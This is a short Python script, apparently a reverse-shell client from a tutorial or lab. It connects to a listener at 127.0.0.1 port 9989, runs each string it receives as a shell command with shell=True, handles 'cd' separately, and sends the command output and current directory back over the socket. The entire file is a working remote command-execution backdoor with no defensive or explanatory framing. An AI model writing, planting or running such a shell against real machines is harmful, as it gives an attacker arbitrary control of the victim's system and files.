import socket
import subprocess 
import os 

stark = socket.socket()
port = 9989
host = '127.0.0.1'

stark.connect((host,port))


while True:
    data = stark.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE,
        stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        stark_byte = cmd.stdout.read() +  cmd.stderr.read()
        output = str(stark_byte,"utf-8")

        CWD = os.getcwd() + '$'
        stark.send(str.encode(output + CWD))

        print(output)